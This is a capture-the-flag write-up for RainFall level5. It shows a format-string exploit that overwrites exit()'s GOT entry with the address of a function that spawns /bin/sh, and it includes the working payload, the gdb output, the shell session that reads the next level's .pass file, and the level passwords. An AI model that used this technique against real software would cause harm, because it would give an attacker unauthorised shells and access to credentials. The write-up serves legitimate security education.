# **Level5**

## **Analysis**

**In `main` :**

- call to function `n()`

**In `n()` :**

- `fgets` on `stdin` to a string `format` with a limited size of `0x200` characters
- and used in `printf(format)` which is a vulnerability, referring to printf man
 ```
    Code such as printf(foo); often indicates a bug, since foo may
    contain a % character.  If foo comes from untrusted user input,
    it may contain %n, causing the printf() call to write to memory
    and creating a security hole.
 ```
- terminated by an `exit()`

We also have a function `o()` never used

**In `o()` :**
- it calls a `system("/bin/sh")`
- terminated by an `exit()`

`o()` adress : 0x080484a4

`exit()` adress: 0x8049838
```
(gdb) info function
All defined functions:
...
0x080483d0  exit
0x080483d0  exit@plt
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...

(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
```

___

## **Exploit**

If we try to store a buffer `ABCD`, its done on the fourth position
```
level5@RainFall:~$ python -c 'print "ABCD" + " %4$x"' | ./level5
ABCD 44434241
```

But we cannot use ret because of the `exit()`
We'll change the adress ont he GOT (Global Offset Table) to point to `o()` adress

> 0x8049838 [exit] -> 0x080484a4 [o()]

```
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/level5 && cat /tmp/level5 - | ./level5
...
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

___

*Password: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a*